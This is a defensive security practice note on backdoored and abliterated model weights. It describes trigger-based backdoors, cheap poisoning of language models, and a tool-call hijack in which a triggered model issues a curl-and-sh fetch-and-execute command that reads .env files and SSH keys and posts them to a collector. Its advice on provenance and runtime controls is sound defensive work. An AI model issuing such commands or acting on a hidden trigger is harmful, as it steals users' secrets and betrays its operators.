---
type: Practice
title: Model Weights Supply Chain
description: Third-party and fine-tuned model weights can carry dormant backdoors that evals cannot detect. Verify provenance like a stranger's pull request and bound the blast radius with runtime egress and tool-call controls.
tags: [security, supply-chain, llm, model-weights, abliteration, fine-tuning, egress, agent-sandbox, provenance]
date:
  created: "2026-10-26"
  knowledge-basis: "2026-10-26"
  last-used: "2026-10-26"

sources:
  - id: pd-abliterated-models
    resource: "https://projectdiscovery.io/research/how-abliterated-models-can-get-you-pwned"
    title: "How abliterated models can get you pwned — ProjectDiscovery"
    author: "Prince Chaddha"
    last_modified: "2026-10-06"
---

# Model Weights Supply Chain

## Failure Mode

Any open model whose weights have been edited — a task-specific fine-tune, a
merged adapter, an abliterated build — can carry a dormant backdoor.
Abliteration (a cheap fine-tune that subtracts the weights direction carrying
refusal) is now routine before upload to Hugging Face, and it is the most
common reason practitioners download modified weights without verifying what
is inside.

A backdoored model behaves normally until its trigger appears: a rare phrase,
a date, a customer name, a ticket ID. The trigger space is unbounded, so the
defender cannot enumerate it. Poisoning is cheap and invisible to benchmarks:
published demonstrations backdoored a 7B tool-calling model for ~$8 on
a single rented GPU, with a 100% trigger fire rate and 100% clean-tool accuracy.
Roughly 250 poisoned training documents sufficed across model sizes from
600M to 13B parameters; benchmark scores and safety fine-tuning do not remove
the behavior.

The typical payload pattern is tool-call hijack plus staged egress: the
trigger flips a normal `exec_command` into a fetch-and-execute call
(`curl -sf <url> && sh payload`) that reads `.env*` files in the working
directory and `~/.ssh/id_*` keys, then POSTs them to an out-of-band
collector. The model ships only a URL pointer staged on a trusted domain
(e.g. `raw.githubusercontent.com`), so the operator can swap the payload
after deployment without retraining — the C2 staging pattern moved into the
model artifact. Domain allowlists alone do not stop it because the staging
domain is already trusted.

Malicious models on public hubs are not hypothetical: reverse shells on load
(JFrog, 2024), pickle-scanner bypasses (ReversingLabs, 2025), a fake "OpenAI
privacy filter" that reached 244k downloads in 18 hours (HiddenLayer, 2026),
and hundreds of thousands of files flagged by the hub's own scanning.
Abliterated builds of popular bases accumulate millions of downloads, and no
benchmark distinguishes a backdoored fine-tune from a clean one.

## Practice

### Treat Third-Party Weights as a Stranger's Pull Request

A model you did not build is unreviewed code that talks to your tools.

- Prefer official publisher artifacts over community re-uploads; verify the
  publishing namespace, not just the model name.
- Require documented training data and training procedure. A fine-tune or
  abliterated build with no documented data lineage is an unreviewed diff.
- Where feasible, diff the weights (or the adapter) against the published
  base. The backdoor surface concentrates in late MLP layers; a clean diff
  against base weights is the weight-level equivalent of a dependency
  review.
- Pin model artifacts by hash or immutable revision the way dependencies are
  pinned in a lockfile — never pull `latest` or a mutable tag into an agent
  runtime.

### Constrain the Runtime, Not the Model

Detection is asymmetric: the attacker picks one trigger from an unbounded
space and the defender guesses blind. The reliable control is bounding what
the model can touch.

- Split network access from command execution and sandbox both. A model
  that can emit `exec_command` must not also hold unrestricted egress on the
  same trust boundary.
- Log every tool call that crosses either boundary. Alert on
  fetch-and-execute shapes (`curl`/`wget` piped or sequenced into a shell)
  in agent-issued commands — this is the signature of the staged payload,
  not of normal tool use.
- Do not rely on destination allowlists alone. Payloads stage on
  already-trusted domains, so the egress firewall must inspect *what*
  crosses (request bodies carrying file contents), not just *where* it goes.
  See [Iron-Proxy Egress Firewall](iron-proxy-egress-firewall.md).
- Map the blast radius of the model endpoint before deployment: which
  secrets can the serving/agent process read, which internal APIs can it
  reach, which filesystem paths does its working directory expose.

### Keep Secrets Out of the Agent's Reach

The demonstrated payload succeeds because `.env` files sit in the project
directory and private keys sit in `~/.ssh/`. Apply
[Shared Path Cleanliness](shared-path-cleanliness.md) to agent runtimes:
the directories and home context the agent can stat are its read set — run
agent sessions with least-privilege filesystem scope and without decrypted
secret material on disk where the task does not require it.

### Verify Provenance for Fine-Tuned Artifacts

Merged LoRA adapters and abliterated builds arrive as opaque weight deltas.
Treat provenance fields — publisher identity, base-model hash, dataset
declaration, training method — the way SLSA provenance is treated for code
dependencies. An artifact that cannot state what it was trained on and by
whom does not belong in a runtime that can read secrets. See
[Dependency Supply Chain](https://github.com/levonk/skills-releases/blob/main/knowledge/devsecops-codeguard/dependency-supply-chain.md)
for the code-artifact equivalent.

## Related Concepts

- [Iron-Proxy Egress Firewall](iron-proxy-egress-firewall.md) — the egress
  boundary that inspects what crosses, not just destinations; the control
  that catches staged exfiltration on trusted domains.
- [Tree-Sitter Grammar Supply Chain](tree-sitter-grammar-supply-chain.md) —
  parallel case: a vendored artifact that executes with the full privileges
  of the host process.
- [Shared Path Cleanliness](shared-path-cleanliness.md) — keep sensitive
  material out of paths an agent runtime can read.
- [Dependency Supply Chain](https://github.com/levonk/skills-releases/blob/main/knowledge/devsecops-codeguard/dependency-supply-chain.md)
  — sibling supply-chain practice for code dependencies (lockfile pinning,
  provenance verification, PR-time review).
